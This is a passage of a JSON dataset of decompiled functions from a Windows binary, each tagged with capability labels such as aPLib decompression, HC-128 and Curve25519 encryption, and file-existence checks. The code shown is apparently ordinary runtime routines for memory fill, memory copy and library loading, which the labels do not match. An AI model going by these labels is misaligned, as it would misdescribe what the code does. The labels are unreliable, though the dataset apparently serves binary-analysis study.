CONCAT115(SUB161(ZEXT816(uVar5) >> 0x38, 0), \n                                                                      CONCAT114(SUB151(ZEXT815(uVar5) >> 0x38, 0), \n                                                                                ZEXT814(uVar5))) >> 0x70, 0), \n                                                            CONCAT113(uVar9, auVar7)) >> 0x68, 0), \n                                                            CONCAT112(uVar9, auVar6)) >> 0x60, 0), \n                                                            CONCAT111(SUB131(auVar7 >> 0x28, 0), ZEXT811(uVar5))) >>\n                                                            0x58, 0), CONCAT110(SUB121(auVar6 >> 0x28, 0), uVar5)) >>\n                                                            0x50, 0), CONCAT19(SUB131(auVar7 >> 0x20, 0), uVar5)) >>\n                                                            0x48, 0), CONCAT18(SUB121(auVar6 >> 0x20, 0), uVar5)) >>\n                                                            0x40, 0), (uVar5 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (uVar5 >> 0x18) << 0x30) >> 0x30, 0), \n                                                            (uVar5 >> 0x10) << 0x28) >> 0x28, 0), \n                                                            (uVar5 >> 0x10) << 0x20) >> 0x20, 0), (uVar4 >> 8) << 0x18)\n                                                 >> 0x18, 0), (uVar5 >> 8) << 0x10) >> 0x10, 0), \n                       uVar3 & 0xff | uVar3 << 8);\n    pauVar1 = arg1;\n    if (0x80 < arg3) {\n        if ((*0x180020264 & 2) != 0) {\n            for (; arg3 != 0; arg3 = arg3 - 1) {\n                (*pauVar1)[0] = noname_1;\n                pauVar1 = *pauVar1 + 1;\n            }\n            return arg1;\n        }\n        *arg1 = auVar8;\n        pauVar1 = arg1[1] & 0xfffffffffffffff0;\n        arg3 = arg1 + (arg3 - pauVar1);\n        uVar5 = arg3 >> 7;\n        if (uVar5 != 0) {\n            if (*0x18001f028 < uVar5) {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n            else {\n                do {\n                    *pauVar1 = auVar8;\n                    pauVar1[1] = auVar8;\n                    pauVar2 = pauVar1[8];\n                    pauVar1[2] = auVar8;\n                    pauVar1[3] = auVar8;\n                    uVar5 = uVar5 - 1;\n                    pauVar1[4] = auVar8;\n                    pauVar1[5] = auVar8;\n                    pauVar1[6] = auVar8;\n                    pauVar1[7] = auVar8;\n                    pauVar1 = pauVar2;\n                } while (uVar5 != 0);\n                arg3 = arg3 & 0x7f;\n            }\n        }\n    }\n    for (uVar5 = arg3 >> 4; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *pauVar1 = auVar8;\n        pauVar1 = pauVar1[1];\n    }\n    if ((arg3 & 0xf) != 0) {\n        *(pauVar1[-1] + (arg3 & 0xf)) = auVar8;\n    }\n    return arg1;\n}\n",
        "token_count": 1915
    },
    "180004b8": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nulong * fcn.180004b80(ulong *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    uint *puVar1;\n    uchar uVar2;\n    ushort uVar3;\n    ulong *puVar4;\n    ulong *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    uchar *puVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    \n    if (arg3 < 0x11) {\n    // switch table (17 cases) at 0x180025050\n        switch(*(arg3 * 4 + 0x180025050) + 0x180000000) {\n        case 0x180004c00:\n            return arg1;\n        case 0x180004c01:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x180004c08:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x180004c0f:\n            uVar2 = *(arg2 + 2);\n            *arg1 = *arg2;\n            *(arg1 + 2) = uVar2;\n            return arg1;\n        case 0x180004c1f:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x180004c25:\n            uVar17 = *(arg2 + 4);\n            uVar18 = *(arg2 + 1);\n            uVar19 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar17;\n            *(arg1 + 1) = uVar18;\n            *(arg1 + 0xc) = uVar19;\n            return arg1;\n        case 0x180004c30:\n            uVar3 = *(arg2 + 1);\n            uVar2 = *(arg2 + 10);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar3;\n            *(arg1 + 10) = uVar2;\n            return arg1;\n        case 0x180004c48:\n            *arg1 = *arg2;\n            return arg1;\n        case 0x180004c50:\n            uVar2 = *(arg2 + 4);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar2;\n            return arg1;\n        case 0x180004c60:\n            uVar3 = *(arg2 + 4);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar3;\n            return arg1;\n        case 0x180004c70:\n            uVar3 = *(arg2 + 4);\n            uVar2 = *(arg2 + 6);\n            *arg1 = *arg2;\n            *(arg1 + 4) = uVar3;\n            *(arg1 + 6) = uVar2;\n            return arg1;\n        case 0x180004c88:\n            uVar17 = *(arg2 + 1);\n            uVar2 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar2;\n            return arg1;\n        case 0x180004ca0:\n            uVar2 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar2;\n            return arg1;\n        case 0x180004cb0:\n            uVar3 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar3;\n            return arg1;\n        case 0x180004cc0:\n            uVar17 = *(arg2 + 1);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            return arg1;\n        case 0x180004cd0:\n            uVar17 = *(arg2 + 1);\n            uVar3 = *(arg2 + 0xc);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar3;\n            return arg1;\n        case 0x180004cf0:\n            uVar17 = *(arg2 + 1);\n            uVar3 = *(arg2 + 0xc);\n            uVar2 = *(arg2 + 0xe);\n            *arg1 = *arg2;\n            *(arg1 + 1) = uVar17;\n            *(arg1 + 0xc) = uVar3;\n            *(arg1 + 0xe) = uVar2;\n            return arg1;\n        }\n    }\n    if (0x20 < arg3) {\n        iVar9 = arg2 - arg1;\n        if ((arg2 < arg1) && (arg1 < arg3 + arg2)) {\n            puVar8 = arg1 + iVar9 + (arg3 - 0x10);\n            uVar17 = puVar8[1];\n            uVar18 = puVar8[2];\n            uVar19 = puVar8[3];\n            puVar6 = arg1 + (arg3 - 0x10);\n            uVar11 = arg3 - 0x10;\n            puVar7 = puVar6;\n            uVar20 = *puVar8;\n            uVar13 = uVar17;\n            uVar14 = uVar18;\n            uVar15 = uVar19;\n            if ((puVar6 & 0xf) != 0) {\n                puVar7 = puVar6 & 0xfffffffffffffff0;\n                puVar1 = puVar7 + iVar9;\n                uVar20 = *puVar1;\n                uVar13 = puVar1[1];\n                uVar14 = puVar1[2];\n                uVar15 = puVar1[3];\n                *puVar6 = *puVar8;\n                *(arg1 + (arg3 - 0xc)) = uVar17;\n                *(arg1 + (arg3 - 8)) = uVar18;\n                *(arg1 + (arg3 - 4)) = uVar19;\n                uVar11 = puVar7 - arg1;\n            }\n            uVar12 = uVar11 >> 7;\n            if (uVar12 != 0) {\n                *puVar7 = uVar20;\n                puVar7[1] = uVar13;\n                puVar7[2] = uVar14;\n                puVar7[3] = uVar15;\n                puVar8 = puVar7;\n                while( true ) {\n                    puVar6 = puVar8 + iVar9 + -0x10;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar7 = puVar8 + iVar9 + -0x20;\n                    uVar20 = *puVar7;\n                    uVar13 = puVar7[1];\n                    uVar14 = puVar7[2];\n                    uVar15 = puVar7[3];\n                    puVar7 = puVar8 + -0x20;\n                    puVar8[-4] = *puVar6;\n                    puVar8[-3] = uVar17;\n                    puVar8[-2] = uVar18;\n                    puVar8[-1] = uVar19;\n                    puVar8[-8] = uVar20;\n                    puVar8[-7] = uVar13;\n                    puVar8[-6] = uVar14;\n                    puVar8[-5] = uVar15;\n                    puVar6 = puVar8 + iVar9 + -0x30;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar1 = puVar8 + iVar9 + -0x40;\n                    uVar20 = *puVar1;\n                    uVar13 = puVar1[1];\n                    uVar14 = puVar1[2];\n                    uVar15 = puVar1[3];\n                    uVar12 = uVar12 - 1;\n                    puVar8[-0xc] = *puVar6;\n                    puVar8[-0xb] = uVar17;\n                    puVar8[-10] = uVar18;\n                    puVar8[-9] = uVar19;\n                    puVar8[-0x10] = uVar20;\n                    puVar8[-0xf] = uVar13;\n                    puVar8[-0xe] = uVar14;\n                    puVar8[-0xd] = uVar15;\n                    puVar6 = puVar8 + iVar9 + -0x50;\n                    uVar17 = puVar6[1];\n                    uVar18 = puVar6[2];\n                    uVar19 = puVar6[3];\n                    puVar1 = puVar8 + iVar9 + -0x60;\n                    uVar20 = *puVar1;\n                    uVar13 = puVar1[1];\n                    uVar14 = puVar1[2];\n                    uVar15 = puVar1[3];\n                    puVar8[-0x14] = *puVar6;\n                    puVar8[-0x13] = uVar17;\n                    puVar8[-0x12] = uVar18;\n                    puVar8[-0x11] = uVar19;\n                    puVar8[-0x18] = uVar20;\n                    puVar8[-0x17] = uVar13;\n                    puVar8[-0x16] = uVar14;\n                    puVar8[-0x15] = uVar15;\n                    puVar1 = puVar8 + iVar9 + -0x70;\n                    uVar17 = puVar1[1];\n                    uVar18 = puVar1[2];\n                    uVar19 = puVar1[3];\n                    puVar6 = puVar7 + iVar9;\n                    uVar20 = *puVar6;\n                    uVar13 = puVar6[1];\n                    uVar14 = puVar6[2];\n                    uVar15 = puVar6[3];\n                    if (uVar12 == 0) break;\n                    puVar8[-0x1c] = *puVar1;\n                    puVar8[-0x1b] = uVar17;\n                    puVar8[-0x1a] = uVar18;\n                    puVar8[-0x19] = uVar19;\n                    *puVar7 = uVar20;\n                    puVar8[-0x1f] = uVar13;\n                    puVar8[-0x1e] = uVar14;\n                    puVar8[-0x1d] = uVar15;\n                    puVar8 = puVar7;\n                }\n                puVar8[-0x1c] = *puVar1;\n                puVar8[-0x1b] = uVar17;\n                puVar8[-0x1a] = uVar18;\n                puVar8[-0x19] = uVar19;\n                uVar11 = uVar11 & 0x7f;\n            }\n            for (uVar12 = uVar11 >> 4; uVar12 != 0; uVar12 = uVar12 - 1) {\n                *puVar7 = uVar20;\n                puVar7[1] = uVar13;\n                puVar7[2] = uVar14;\n                puVar7[3] = uVar15;\n                puVar7 = puVar7 + -4;\n                puVar8 = puVar7 + iVar9;\n                uVar20 = *puVar8;\n                uVar13 = puVar8[1];\n                uVar14 = puVar8[2];\n                uVar15 = puVar8[3];\n            }\n            if ((uVar11 & 0xf) != 0) {\n                uVar17 = *(arg2 + 4);\n                uVar18 = *(arg2 + 1);\n                uVar19 = *(arg2 + 0xc);\n                *arg1 = *arg2;\n                *(arg1 + 4) = uVar17;\n                *(arg1 + 1) = uVar18;\n                *(arg1 + 0xc) = uVar19;\n            }\n            *puVar7 = uVar20;\n            puVar7[1] = uVar13;\n            puVar7[2] = uVar14;\n            puVar7[3] = uVar15;\n            return arg1;\n        }\n        if (arg3 < 0x81) {\n            puVar8 = arg1 + iVar9;\n            uVar17 = *puVar8;\n            uVar18 = puVar8[1];\n            uVar19 = puVar8[2];\n            uVar20 = puVar8[3];\n            puVar5 = arg1 + 2;\n            puVar10 = arg3 - 0x10;\n        }\n        else {\n            if ((*0x180020264 & 2) != 0) {\n                puVar5 = arg1;\n                for (; arg3 != 0; arg3 = arg3 - 1) {\n                    *puVar5 = *arg2;\n                    arg2 = arg2 + 1;\n                    puVar5 = puVar5 + 1;\n                }\n                return arg1;\n            }\n            puVar8 = arg1 + iVar9;\n            uVar13 = puVar8[1];\n            uVar14 = puVar8[2];\n            uVar15 = puVar8[3];\n            puVar4 = arg1 + 2;\n            uVar17 = *puVar8;\n            uVar18 = uVar13;\n            uVar19 = uVar14;\n            uVar20 = uVar15;\n            if ((arg1 & 0xf) != 0) {\n                puVar7 = (puVar4 & 0xfffffffffffffff0) + iVar9;\n                uVar17 = *puVar7;\n                uVar18 = puVar7[1];\n                uVar19 = puVar7[2];\n                uVar20 = puVar7[3];\n                puVar4 = (puVar4 & 0xfffffffffffffff0) + 0x10;\n                *arg1 = *puVar8;\n                *(arg1 + 4) = uVar13;\n                *(arg1 + 1) = uVar14;\n                *(arg1 + 0xc) = uVar15;\n            }\n            puVar10 = arg1 + (arg3 - puVar4);\n            uVar11 = puVar10 >> 7;\n            puVar5 = puVar4;\n            if (uVar11 != 0) {\n                *(puVar4 + -2) = uVar17;\n                *(puVar4 + -0xc) = uVar18;\n                *(puVar4 + -1) = uVar19;\n                *(puVar4 + -4) = uVar20;\n                if (*0x18001f020 < uVar11) {\n                    while( true ) {\n                        puVar8 = puVar4 + iVar9;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x10;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        puVar5 = puVar4 + 0x10;\n                        *puVar4 = *puVar8;\n                        *(puVar4 + 4) = uVar17;\n                        *(puVar4 + 1) = uVar18;\n                        *(puVar4 + 0xc) = uVar19;\n                        *(puVar4 + 2) = uVar20;\n                        *(puVar4 + 0x14) = uVar13;\n                        *(puVar4 + 3) = uVar14;\n                        *(puVar4 + 0x1c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x20;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x30;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        uVar11 = uVar11 - 1;\n                        *(puVar4 + 4) = *puVar8;\n                        *(puVar4 + 0x24) = uVar17;\n                        *(puVar4 + 5) = uVar18;\n                        *(puVar4 + 0x2c) = uVar19;\n                        *(puVar4 + 6) = uVar20;\n                        *(puVar4 + 0x34) = uVar13;\n                        *(puVar4 + 7) = uVar14;\n                        *(puVar4 + 0x3c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x40;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x50;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        *(puVar4 + 8) = *puVar8;\n                        *(puVar4 + 0x44) = uVar17;\n                        *(puVar4 + 9) = uVar18;\n                        *(puVar4 + 0x4c) = uVar19;\n                        *(puVar4 + 10) = uVar20;\n                        *(puVar4 + 0x54) = uVar13;\n                        *(puVar4 + 0xb) = uVar14;\n                        *(puVar4 + 0x5c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x60;\n                        uVar13 = *puVar8;\n                        uVar14 = puVar8[1];\n                        uVar15 = puVar8[2];\n                        uVar16 = puVar8[3];\n                        puVar8 = puVar4 + iVar9 + 0x70;\n                        uVar17 = *puVar8;\n                        uVar18 = puVar8[1];\n                        uVar19 = puVar8[2];\n                        uVar20 = puVar8[3];\n                        if (uVar11 == 0) break;\n                        *(puVar4 + 0xc) = uVar13;\n                        *(puVar4 + 100) = uVar14;\n                        *(puVar4 + 0xd) = uVar15;\n                        *(puVar4 + 0x6c) = uVar16;\n                        *(puVar4 + 0xe) = uVar17;\n                        *(puVar4 + 0x74) = uVar18;\n                        *(puVar4 + 0xf) = uVar19;\n                        *(puVar4 + 0x7c) = uVar20;\n                        puVar4 = puVar5;\n                    }\n                }\n                else {\n                    while( true ) {\n                        puVar8 = puVar4 + iVar9;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x10;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        puVar5 = puVar4 + 0x10;\n                        *puVar4 = *puVar8;\n                        *(puVar4 + 4) = uVar17;\n                        *(puVar4 + 1) = uVar18;\n                        *(puVar4 + 0xc) = uVar19;\n                        *(puVar4 + 2) = uVar20;\n                        *(puVar4 + 0x14) = uVar13;\n                        *(puVar4 + 3) = uVar14;\n                        *(puVar4 + 0x1c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x20;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x30;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        uVar11 = uVar11 - 1;\n                        *(puVar4 + 4) = *puVar8;\n                        *(puVar4 + 0x24) = uVar17;\n                        *(puVar4 + 5) = uVar18;\n                        *(puVar4 + 0x2c) = uVar19;\n                        *(puVar4 + 6) = uVar20;\n                        *(puVar4 + 0x34) = uVar13;\n                        *(puVar4 + 7) = uVar14;\n                        *(puVar4 + 0x3c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x40;\n                        uVar17 = puVar8[1];\n                        uVar18 = puVar8[2];\n                        uVar19 = puVar8[3];\n                        puVar7 = puVar4 + iVar9 + 0x50;\n                        uVar20 = *puVar7;\n                        uVar13 = puVar7[1];\n                        uVar14 = puVar7[2];\n                        uVar15 = puVar7[3];\n                        *(puVar4 + 8) = *puVar8;\n                        *(puVar4 + 0x44) = uVar17;\n                        *(puVar4 + 9) = uVar18;\n                        *(puVar4 + 0x4c) = uVar19;\n                        *(puVar4 + 10) = uVar20;\n                        *(puVar4 + 0x54) = uVar13;\n                        *(puVar4 + 0xb) = uVar14;\n                        *(puVar4 + 0x5c) = uVar15;\n                        puVar8 = puVar4 + iVar9 + 0x60;\n                        uVar13 = *puVar8;\n                        uVar14 = puVar8[1];\n                        uVar15 = puVar8[2];\n                        uVar16 = puVar8[3];\n                        puVar8 = puVar4 + iVar9 + 0x70;\n                        uVar17 = *puVar8;\n                        uVar18 = puVar8[1];\n                        uVar19 = puVar8[2];\n                        uVar20 = puVar8[3];\n                        if (uVar11 == 0) break;\n                        *(puVar4 + 0xc) = uVar13;\n                        *(puVar4 + 100) = uVar14;\n                        *(puVar4 + 0xd) = uVar15;\n                        *(puVar4 + 0x6c) = uVar16;\n                        *(puVar4 + 0xe) = uVar17;\n                        *(puVar4 + 0x74) = uVar18;\n                        *(puVar4 + 0xf) = uVar19;\n                        *(puVar4 + 0x7c) = uVar20;\n                        puVar4 = puVar5;\n                    }\n                }\n                *(puVar5 + -4) = uVar13;\n                *(puVar5 + -0x1c) = uVar14;\n                *(puVar5 + -3) = uVar15;\n                *(puVar5 + -0x14) = uVar16;\n                puVar10 = puVar10 & 0x7f;\n            }\n        }\n        for (uVar11 = puVar10 >> 4; uVar11 != 0; uVar11 = uVar11 - 1) {\n            *(puVar5 + -2) = uVar17;\n            *(puVar5 + -0xc) = uVar18;\n            *(puVar5 + -1) = uVar19;\n            *(puVar5 + -4) = uVar20;\n            puVar8 = puVar5 + iVar9;\n            uVar17 = *puVar8;\n            uVar18 = puVar8[1];\n            uVar19 = puVar8[2];\n            uVar20 = puVar8[3];\n            puVar5 = puVar5 + 2;\n        }\n        uVar11 = puVar10 & 0xf;\n        if (uVar11 != 0) {\n            puVar8 = puVar5 + iVar9 + (uVar11 - 0x10);\n            uVar13 = puVar8[1];\n            uVar14 = puVar8[2];\n            uVar15 = puVar8[3];\n            *(puVar5 + (uVar11 - 0x10)) = *puVar8;\n            *(puVar5 + (uVar11 - 0xc)) = uVar13;\n            *(puVar5 + (uVar11 - 8)) = uVar14;\n            *(puVar5 + (uVar11 - 4)) = uVar15;\n        }\n        *(puVar5 + -2) = uVar17;\n        *(puVar5 + -0xc) = uVar18;\n        *(puVar5 + -1) = uVar19;\n        *(puVar5 + -4) = uVar20;\n        return arg1;\n    }\n    uVar17 = *(arg2 + 4);\n    uVar18 = *(arg2 + 1);\n    uVar19 = *(arg2 + 0xc);\n    puVar8 = arg2 + (arg3 - 0x10);\n    uVar20 = *puVar8;\n    uVar13 = puVar8[1];\n    uVar14 = puVar8[2];\n    uVar15 = puVar8[3];\n    *arg1 = *arg2;\n    *(arg1 + 4) = uVar17;\n    *(arg1 + 1) = uVar18;\n    *(arg1 + 0xc) = uVar19;\n    puVar8 = arg1 + (arg3 - 0x10);\n    *puVar8 = uVar20;\n    puVar8[1] = uVar13;\n    puVar8[2] = uVar14;\n    puVar8[3] = uVar15;\n    return arg1;\n}\n",
        "token_count": 6044
    },
    "18000465": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.180004650(void)\n\n{\n    if (*0x18001f030 != 0xffffffff) {\n        fcn.1800048f0(*0x18001f030);\n        *0x18001f030 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 64
    },
    "18000883": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar fcn.18000883c(void)\n\n{\n    if (*0x18001f050 != 0xffffffff) {\n        fcn.18000a8bc(*0x18001f050);\n        *0x18001f050 = 0xffffffff;\n    }\n    return 1;\n}\n",
        "token_count": 65
    },
    "18000b83": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.18000b838(int64_t *arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    int64_t iVar13;\n    ulong uStackX24;\n    int64_t iStackX32;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_bp_10h;\n    \n    uVar9 = 0;\n    if (arg2 == NULL) {\n        puVar4 = fcn.18000528c();\n        *puVar4 = 0x16;\n        fcn.18000516c();\n        uVar5 = 0x16;\n    }\n    else {\n        *arg2 = 0;\n        iVar6 = *arg1;\n        auStack88 = ZEXT816(0);\n        uStack72 = 0;\n        while (iVar6 != 0) {\n            uStackX24 = CONCAT53(uStackX24._3_5_, 0x3f2a);\n            iVar6 = fcn.18000feb0(iVar6, &uStackX24);\n            if (iVar6 == 0) {\n                uVar2 = fcn.18000b3a0(*arg1, 0, 0, auStack88);\n            }\n            else {\n                uVar2 = fcn.18000b528(*arg1, iVar6, auStack88);\n            }\n            uVar5 = uVar2;\n            if (uVar2 != 0) {\n                goto code_r0x00018000b335;\n            }\n            arg1 = arg1 + 1;\n            iVar6 = *arg1;\n        }\n        uStackX24 = 0;\n        iVar6 = (auStack88._8_8_ - auStack88._0_8_ >> 3) + 1;\n        uVar5 = (auStack88._8_8_ - auStack88._0_8_) + 7U >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar5 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        uVar10 = uVar9;\n        uVar11 = uVar9;\n        if (uVar5 != 0) {\n            do {\n                iVar7 = -1;\n                do {\n                    iVar7 = iVar7 + 1;\n                } while (*(*piVar8 + iVar7) != '\\0');\n                piVar8 = piVar8 + 1;\n                uVar11 = uVar11 + 1 + iVar7;\n                uVar10 = uVar10 + 1;\n                uStackX24 = uVar11;\n            } while (uVar10 != uVar5);\n        }\n        iVar7 = fcn.18000727c(iVar6, uStackX24);\n        uVar5 = 0xffffffffffffffff;\n        if (iVar7 != 0) {\n            iVar6 = iVar7 + iVar6 * 8;\n            iStackX32 = iVar6;\n            if (auStack88._0_8_ != auStack88._8_8_) {\n                piVar8 = auStack88._0_8_;\n                do {\n                    iVar12 = -1;\n                    do {\n                        iVar13 = iVar12;\n                        iVar12 = iVar13 + 1;\n                    } while (*(*piVar8 + iVar12) != '\\0');\n                    iVar13 = iVar13 + 2;\n                    iVar3 = fcn.18000fd30(iStackX32, (iVar6 - iStackX32) + uStackX24, *piVar8, iVar13);\n                    if (iVar3 != 0) {\n                        fcn.18000518c(0, 0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        uVar9 = (*pcVar1)();\n                        return uVar9;\n                    }\n                    *((iVar7 - auStack88._0_8_) + piVar8) = iStackX32;\n                    iStackX32 = iStackX32 + iVar13;\n                    piVar8 = piVar8 + 1;\n                } while (piVar8 != auStack88._8_8_);\n            }\n            *arg2 = iVar7;\n            uVar5 = uVar9;\n        }\n        fcn.180008d70(0);\ncode_r0x00018000b335:\n        uVar10 = auStack88._8_8_ + (7 - auStack88._0_8_) >> 3;\n        if (auStack88._8_8_ < auStack88._0_8_) {\n            uVar10 = uVar9;\n        }\n        piVar8 = auStack88._0_8_;\n        if (uVar10 != 0) {\n            do {\n                fcn.180008d70(*piVar8);\n                uVar9 = uVar9 + 1;\n                piVar8 = piVar8 + 1;\n            } while (uVar9 != uVar10);\n        }\n        fcn.180008d70(auStack88._0_8_);\n        uVar5 = uVar5 & 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 1358
    },
    "18000a61": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nuint64_t fcn.18000a610(ulong arg1, ulong arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    ulong arg1_00;\n    int64_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    uVar7 = arg1;\n    uVar6 = *0x18001f010 ^ *(uVar7 * 8 + 0x180020a60);\n    uVar3 = *0x18001f010 & 0x3f;\n    uVar6 = uVar6 >> uVar3 | uVar6 << 0x40 - uVar3;\n    if (uVar6 != 0xffffffffffffffff) {\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n        if (arg3 != arg4) {\n            do {\n                uVar6 = *arg3;\n                iVar5 = *(uVar6 * 8 + 0x1800209c0);\n                if (iVar5 == 0) {\n                    arg1_00 = *(uVar6 * 8 + 0x1800162b0);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0);\n                    if (iVar5 == 0) {\n                        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (((iVar4 == 0x57) && (iVar4 = fcn.1800081d0(arg1_00, L\"api-ms-\", 7),  iVar4 != 0)) &&\n                           (iVar4 = fcn.1800081d0(arg1_00, L\"ext-ms-\", 7),  iVar4 != 0)) {\n                            iVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(arg1_00, 0, 0);\n                        }\n                        else {\n                            iVar5 = 0;\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        piVar1 = uVar6 * 8 + 0x1800209c0;\n                        iVar2 = *piVar1;\n                        *piVar1 = iVar5;\n                        if (iVar2 != 0) {\n                            (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar5);\n                        }\n                        goto code_r0x00018000a742;\n                    }\n                    *(uVar6 * 8 + 0x1800209c0) = 0xffffffffffffffff;\n                }\n                else if (iVar5 != -1) {\ncode_r0x00018000a742:\n                    if (iVar5 != 0) goto code_r0x00018000a75d;\n                }\n                arg3 = arg3 + 1;\n            } while (arg3 != arg4);\n        }\n        iVar5 = 0;\ncode_r0x00018000a75d:\n        if ((iVar5 != 0) && (uVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar5, arg2),  uVar6 != 0)) {\n            uVar3 = 0x40 - (*0x18001f010 & 0x3f) & 0x3f;\n            *(uVar7 * 8 + 0x180020a60) = (uVar6 >> uVar3 | uVar6 << 0x40 - uVar3) ^ *0x18001f010;\n            return uVar6;\n        }\n        uVar3 = 0x40 - (*0x18001f010 & 0x3f) & 0x3f;\n        *(uVar7 * 8 + 0x180020a60) = (0xffffffffffffffffU >> uVar3 | -1 << 0x40 - uVar3) ^ *0x18001f010;\n    }\n    return 0;\n}\n",
        "token_count": 877
    },
    "18000c98": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
